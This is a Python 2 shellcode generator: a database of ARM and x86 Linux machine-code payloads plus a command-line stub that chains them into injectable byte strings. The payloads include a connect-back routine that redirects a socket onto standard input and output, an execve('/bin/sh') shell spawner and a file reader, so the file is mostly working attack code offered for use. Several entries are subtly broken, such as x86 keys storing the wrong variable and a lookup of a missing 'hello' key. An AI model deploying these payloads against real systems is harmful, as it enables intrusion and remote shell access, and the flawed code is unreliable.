#!/usr/bin/python

# begin generated code

# THIS CODE WAS GENERATED BY make_shellcode_db.py
# IF YOU WOULD LIKE TO EDIT, READ THE DOCUMENTATION

shellcode_db = dict()

sc = ""
sc += "\x70\x00\x20\xe1"

if "independent" not in shellcode_db: shellcode_db["independent"] = dict()
if "arm" not in shellcode_db["independent"]: shellcode_db["independent"]["arm"] = dict()
if "unoptimized" not in shellcode_db["independent"]["arm"]: shellcode_db["independent"]["arm"]["unoptimized"] = dict()
shellcode_db["independent"]["arm"]["unoptimized"]["debug"] = sc

sc = ""
sc += "\xfe\xff\xff\xea"

if "independent" not in shellcode_db: shellcode_db["independent"] = dict()
if "arm" not in shellcode_db["independent"]: shellcode_db["independent"]["arm"] = dict()
if "unoptimized" not in shellcode_db["independent"]["arm"]: shellcode_db["independent"]["arm"]["unoptimized"] = dict()
shellcode_db["independent"]["arm"]["unoptimized"]["spin"] = sc

sc = ""
sc += "\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x00\x20\xa0\xe3\xff\x70\xa0\xe3"
sc += "\x1a\x70\x87\xe2\x00\x00\x00\xef\x00\x00\x50\xe3\x15\x00\x00\xba"
sc += "\x00\x40\xa0\xe1\x04\x00\xa0\xe1\x54\x10\x8f\xe2\x10\x20\xa0\xe3"
sc += "\xff\x70\xa0\xe3\x1c\x70\x87\xe2\x00\x00\x00\xef\x00\x00\x50\xe3"
sc += "\x0c\x00\x00\x1a\x04\x00\xa0\xe1\x00\x10\xa0\xe3\x3f\x70\xa0\xe3"
sc += "\x00\x00\x00\xef\x04\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0\xe3"
sc += "\x00\x00\x00\xef\x04\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70\xa0\xe3"
sc += "\x00\x00\x00\xef\x04\x00\x00\xea\x00\x00\xa0\xe3\x01\x70\xa0\xe3"
sc += "\x00\x00\x00\xef\x02\x00\x04\xd2\x7f\x00\x00\x01"

if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
if "arm" not in shellcode_db["linux"]: shellcode_db["linux"]["arm"] = dict()
if "unoptimized" not in shellcode_db["linux"]["arm"]: shellcode_db["linux"]["arm"]["unoptimized"] = dict()
shellcode_db["linux"]["arm"]["unoptimized"]["connect"] = sc

sc = ""
sc += "\x00\x00\xa0\xe3\x01\x00\x2d\xe9\x44\x00\x8f\xe2\x00\x10\xd0\xe5"
sc += "\x00\x00\x51\xe3\x04\x00\x00\x0a\x01\x00\x2d\xe9\x01\x10\xd0\xe4"
sc += "\x00\x00\x51\xe3\xfc\xff\xff\x1a\xf7\xff\xff\xea\x00\x00\x9d\xe5"
sc += "\x0d\x10\xa0\xe1\x00\x20\xa0\xe3\x04\x00\x2d\xe9\x0d\x20\xa0\xe1"
sc += "\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3"
sc += "\x00\x00\x00\xef\x2d\x61\x00\x2f\x62\x69\x6e\x2f\x75\x6e\x61\x6d"
sc += "\x65\x00\x00\x00"

if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
if "arm" not in shellcode_db["linux"]: shellcode_db["linux"]["arm"] = dict()
if "unoptimized" not in shellcode_db["linux"]["arm"]: shellcode_db["linux"]["arm"]["unoptimized"] = dict()
shellcode_db["linux"]["arm"]["unoptimized"]["execve"] = sc

sc = ""
sc += "\x18\x00\x8f\xe2\x00\x10\xa0\xe3\x00\x20\xa0\xe3\x0b\x70\xa0\xe3"
sc += "\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef"
sc += "\x2f\x62\x69\x6e\x2f\x73\x68\x00"

if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
if "arm" not in shellcode_db["linux"]: shellcode_db["linux"]["arm"] = dict()
if "unoptimized" not in shellcode_db["linux"]["arm"]: shellcode_db["linux"]["arm"]["unoptimized"] = dict()
shellcode_db["linux"]["arm"]["unoptimized"]["execve_sh"] = sc

sc = ""
sc += "\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef"

if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
if "arm" not in shellcode_db["linux"]: shellcode_db["linux"]["arm"] = dict()
if "unoptimized" not in shellcode_db["linux"]["arm"]: shellcode_db["linux"]["arm"]["unoptimized"] = dict()
shellcode_db["linux"]["arm"]["unoptimized"]["exit"] = sc

sc = ""
sc += "\x01\x00\xa0\xe3\x14\x10\x8f\xe2\x0d\x20\xa0\xe3\x04\x70\xa0\xe3"
sc += "\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef"
sc += "\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0a\x00\x00\x00"

if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
if "arm" not in shellcode_db["linux"]: shellcode_db["linux"]["arm"] = dict()
if "unoptimized" not in shellcode_db["linux"]["arm"]: shellcode_db["linux"]["arm"]["unoptimized"] = dict()
shellcode_db["linux"]["arm"]["unoptimized"]["helloworld"] = sc

sc = ""
sc += "\x6c\x00\x8f\xe2\x00\x10\xa0\xe3\x00\x20\xa0\xe3\x05\x70\xa0\xe3"
sc += "\x00\x00\x00\xef\x00\x00\x50\xe3\x12\x00\x00\xba\x00\x60\xa0\xe1"
sc += "\x00\x00\xa0\xe3\x01\x00\x2d\xe9\x06\x00\xa0\xe1\x0d\x10\xa0\xe1"
sc += "\x01\x20\xa0\xe3\x03\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\x50\xe3"
sc += "\x05\x00\x00\xda\x01\x00\xa0\xe3\x0d\x10\xa0\xe1\x01\x20\xa0\xe3"
sc += "\x04\x70\xa0\xe3\x00\x00\x00\xef\xf2\xff\xff\xea\x06\x00\xa0\xe1"
sc += "\x06\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3"
sc += "\x00\x00\x00\xef\x72\x65\x61\x64\x66\x69\x6c\x65\x2e\x73\x00\x00"

if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
if "arm" not in shellcode_db["linux"]: shellcode_db["linux"]["arm"] = dict()
if "unoptimized" not in shellcode_db["linux"]["arm"]: shellcode_db["linux"]["arm"]["unoptimized"] = dict()
shellcode_db["linux"]["arm"]["unoptimized"]["readfile"] = sc

debug_shellcode = ""
debug_shellcode += "\xcd\x0c"

if "independent" not in shellcode_db: shellcode_db["independent"] = dict()
if "x86" not in shellcode_db["independent"]: shellcode_db["independent"]["x86"] = dict()
if "unoptimized" not in shellcode_db["independent"]["x86"]: shellcode_db["independent"]["x86"]["unoptimized"] = dict()
shellcode_db["independent"]["x86"]["unoptimized"]["debug"] = sc

spin_shellcode = ""
spin_shellcode += "\xe9\xfb\xff\xff\xff"

if "independent" not in shellcode_db: shellcode_db["independent"] = dict()
if "x86" not in shellcode_db["independent"]: shellcode_db["independent"]["x86"] = dict()
if "unoptimized" not in shellcode_db["independent"]["x86"]: shellcode_db["independent"]["x86"]["unoptimized"] = dict()
shellcode_db["independent"]["x86"]["unoptimized"]["spin"] = sc

sc = ""
sc += "\xeb\x71\x5e\xb8\x66\x00\x00\x00\xbb\x01\x00\x00\x00\x6a\x00\x6a"
sc += "\x01\x6a\x02\x89\xe1\xcd\x80\x83\xc4\x0c\x83\xf8\x00\x7c\x48\x89"
sc += "\xc7\xb8\x66\x00\x00\x00\xbb\x03\x00\x00\x00\x6a\x10\x56\x57\x89"
sc += "\xe1\xcd\x80\x83\xc4\x0c\x83\xf8\x00\x75\x2c\xb8\x3f\x00\x00\x00"
sc += "\x89\xfb\xb9\x00\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\x89\xfb"
sc += "\xb9\x01\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\x89\xfb\xb9\x03"
sc += "\x00\x00\x00\xcd\x80\xeb\x19\xb8\x01\x00\x00\x00\xbb\x00\x00\x00"
sc += "\x00\xcd\x80\xe8\x8a\xff\xff\xff\x02\x00\x04\xd2\x7f\x00\x00\x01"

if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
if "x86" not in shellcode_db["linux"]: shellcode_db["linux"]["x86"] = dict()
if "unoptimized" not in shellcode_db["linux"]["x86"]: shellcode_db["linux"]["x86"]["unoptimized"] = dict()
shellcode_db["linux"]["x86"]["unoptimized"]["connect"] = sc

sc = ""
sc += "\xeb\x37\x5e\x6a\x00\x89\xf0\xeb\x03\x83\xc0\x01\x80\x38\x00\x74"
sc += "\x0b\x50\x80\x38\x00\x74\xf2\x83\xc0\x01\xeb\xf6\x6a\x00\x89\xe2"
sc += "\x8d\x4c\x24\x04\x8b\x19\xb8\x0b\x00\x00\x00\xcd\x80\xb8\x01\x00"
sc += "\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc4\xff\xff\xff\x2d\x61"
sc += "\x00\x2f\x62\x69\x6e\x2f\x75\x6e\x61\x6d\x65\x00\x00"

if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
if "x86" not in shellcode_db["linux"]: shellcode_db["linux"]["x86"] = dict()
if "unoptimized" not in shellcode_db["linux"]["x86"]: shellcode_db["linux"]["x86"]["unoptimized"] = dict()
shellcode_db["linux"]["x86"]["unoptimized"]["execve"] = sc

sc = ""
sc += "\xeb\x14\x5e\xb8\x0b\x00\x00\x00\x89\xf3\xb9\x00\x00\x00\x00\xba"
sc += "\x00\x00\x00\x00\xcd\x80\xe8\xe7\xff\xff\xff\x2f\x62\x69\x6e\x2f"
sc += "\x73\x68\x00"

if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
if "x86" not in shellcode_db["linux"]: shellcode_db["linux"]["x86"] = dict()
if "unoptimized" not in shellcode_db["linux"]["x86"]: shellcode_db["linux"]["x86"]["unoptimized"] = dict()
shellcode_db["linux"]["x86"]["unoptimized"]["execve_sh"] = sc

sc = ""
sc += "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80"

if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
if "x86" not in shellcode_db["linux"]: shellcode_db["linux"]["x86"] = dict()
if "unoptimized" not in shellcode_db["linux"]["x86"]: shellcode_db["linux"]["x86"]["unoptimized"] = dict()
shellcode_db["linux"]["x86"]["unoptimized"]["exit"] = sc

sc = ""
sc += "\xeb\x31\x5e\x89\xf0\x51\x89\xc1\x80\x39\x00\x74\x05\x83\xc1\x01"
sc += "\xeb\xf6\x29\xc1\x89\xc8\x59\x89\xc2\x89\xf1\xbb\x01\x00\x00\x00"
sc += "\xb8\x04\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00"
sc += "\x00\xcd\x80\xe8\xca\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f"
sc += "\x72\x6c\x64\x21\x0a\x00"

if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
if "x86" not in shellcode_db["linux"]: shellcode_db["linux"]["x86"] = dict()
if "unoptimized" not in shellcode_db["linux"]["x86"]: shellcode_db["linux"]["x86"]["unoptimized"] = dict()
shellcode_db["linux"]["x86"]["unoptimized"]["helloworld"] = sc

sc = ""
sc += "\xeb\x57\x5e\xb8\x05\x00\x00\x00\x89\xf3\xb9\x00\x00\x00\x00\xba"
sc += "\x00\x00\x00\x00\xcd\x80\x89\xc7\x6a\x00\xb8\x03\x00\x00\x00\x89"
sc += "\xfb\x89\xe1\xba\x01\x00\x00\x00\xcd\x80\x83\xf8\x00\x7e\x1e\xb8"
sc += "\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x89\xe1\xba\x01\x00\x00\x00"
sc += "\xcd\x80\xeb\xd6\xb8\x06\x00\x00\x00\x89\xfb\xcd\x80\xb8\x01\x00"
sc += "\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xa4\xff\xff\xff\x72\x65"
sc += "\x61\x64\x66\x69\x6c\x65\x2e\x73\x00"

if "linux" not in shellcode_db: shellcode_db["linux"] = dict()
if "x86" not in shellcode_db["linux"]: shellcode_db["linux"]["x86"] = dict()
if "unoptimized" not in shellcode_db["linux"]["x86"]: shellcode_db["linux"]["x86"]["unoptimized"] = dict()
shellcode_db["linux"]["x86"]["unoptimized"]["readfile"] = sc

# end of generated code
# BEGIN pyshellcode_stub.py

import socket
import struct

def bin2py(sc, varname = "shellcode"):
	code = ""
	code += "%s = \"\"\n" % (varname)
	for i in range(0, len(sc), 16):
		line = sc[i:i+16]
		s = ""
		for x in line:
			s += "\\x%02x" % (ord(x))
		code += "%s += \"%s\"\n" % (varname, s)
	return code

class shellcode:
	def __init__(self, platform, architecture, optimization="unoptimized"):
		self.platform = platform
		self.architecture = architecture
		self.optimization = optimization
		self.code = ""
	def connect(self, ip, port):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["connect"][:-8]
		self.code += self.connect_parameters(ip, port)
		return self
	def connect_parameters(self, ip, port):
		return struct.pack("!H", port) + socket.inet_aton(ip)
	def helloworld(self):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["hello"]
		return self
	def execve(self, parameter_list):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["execve"][:-15]
		self.code += self.execve_parameters(parameter_list)
		return self
	def execve_parameters(self, parameter_list):
		p = ""
		for x in reversed(parameter_list):
			p += x + "\x00"
		p += "\x00"
		return p
	def execve_sh(self):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["execve_sh"]
		return self
	def exit(self):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["exit"]
		return self
	def readfile(self, filename):
		self.code += shellcode_db[self.platform][self.architecture][self.optimization]["readfile"][:-11]
		self.code += self.readfile_params(filename)
		return self
	def readfile_params(self, filename):
		return filename + "\x00"
		

if __name__ == "__main__":
	import sys
	#s = shellcode("linux", "arm").connect("192.168.90.1", 1234)
	#print bin2py(s.code, "shellcode")
	#s = shellcode("linux", "x86").connect("127.0.0.1", 1243)
	#print bin2py(s.code, "shellcode")
	if(len(sys.argv) < 2):
		print "%s: [os] [architecture] [optimization] [comands ...]" % (sys.argv[0])
		print "\tCommands:"
		print "\t\tconnect [ip] [port]"
		print "\t\thelloworld"
		print "\t\texecve [args ...] [end_execve]"
		print "\t\texecve_sh"
		print "\t\texit"
		print "\t\treadfile [filename]"
		print "\t\tpython"
		print "\t\tdump"
		print "\tOS's:"
		for x in shellcode_db.keys():
			print "\t\t%s" % (x)
	elif(len(sys.argv) == 2):
		print "archictectures:"
		platform = sys.argv[1]
		for x in shellcode_db[platform].keys():
			print "\t%s" % (x)
	elif(len(sys.argv) == 3):
		print "optimizations:"
		platform = sys.argv[1]
		arch = sys.argv[2]
		for x in shellcode_db[platform][arch].keys():
			print "\t%s" % (x)
	elif(len(sys.argv) == 4):
		print "shellcodes:"
		platform = sys.argv[1]
		arch = sys.argv[2]
		optimization = sys.argv[3]
		for x in shellcode_db[platform][arch][optimization].keys():
			print "\t%s" % (x)
	else:
		platform = sys.argv[1]
		arch = sys.argv[2]
		optimization = sys.argv[3]
		s = shellcode(platform, arch, optimization)
		i = 4
		while(i < len(sys.argv)):
			if(sys.argv[i] == "connect"):
				if(i+2 < len(sys.argv)):
					s.connect(sys.argv[i+1], int(sys.argv[i+2]))
					i += 3
				else:
					print "connect: missing parameters"
					sys.exit(0)
			elif(sys.argv[i] == "helloworld"):
				s.helloworld()
				i += 1
			elif(sys.argv[i] == "execve"):
				i += 1
				p = []
				while(i < len(sys.argv) and sys.argv[i] != "end_execve"):
					p += [sys.argv[i]]
					i += 1
				s.execve(tuple(p))
				i += 1
			elif(sys.argv[i] == "exit"):
				s.exit()
				i += 1
			elif(sys.argv[i] == "readfile"):
				if(i+1 < len(sys.argv)):
					s.readfile(sys.argv[i+1])
					i += 2
				else:
					print "readfile: missing parameters"
					sys.exit(0)
			elif(sys.argv[i] == "python"):
				print bin2py(s.code, "shellcode")
				i += 1
			elif(sys.argv[i] == "dump"):
				sys.stdout.write(s.code)
				i += 1
			else:
				print "%s: unknown command" % (sys.argv[i])
				sys.exit(0)



# END pyshellcode_stub.py